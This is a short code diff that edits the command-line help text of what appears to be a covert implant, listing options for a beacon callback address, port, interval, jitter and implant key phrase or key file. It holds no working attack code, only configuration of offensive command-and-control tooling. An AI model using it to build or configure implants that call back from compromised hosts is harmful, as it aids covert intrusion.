@@ -76,9 +76,9 @@ static void printUsage(char* exeName)
 	printf("\t\t-a <address>           - beacon IP address to callback to\n");
 	printf("\t\t-p <port>              - beacon port (default: 443)\n");
 	printf("\t\t-i <interval>          - beacon interval in seconds\n");
-	printf("\t\t-k <id key>            - implant Key derived from patching keyPhrase \n");
+	printf("\t\t-k <id key>            - implant key phrase\n");
+	printf("\t\t-K <id key>            - implant key file\n");
 	printf("\t\t-j <jitter>            - integer for percent jitter (0 <= jitter <= 30, default: 3 )\n");
-	printf("\t\t-j <ID key>            - identification key (REQUIRED)\n");
 #ifdef SOLARIS
 	printf("\t\t-I <interface>         - interface on which to listen\n");
 #endif
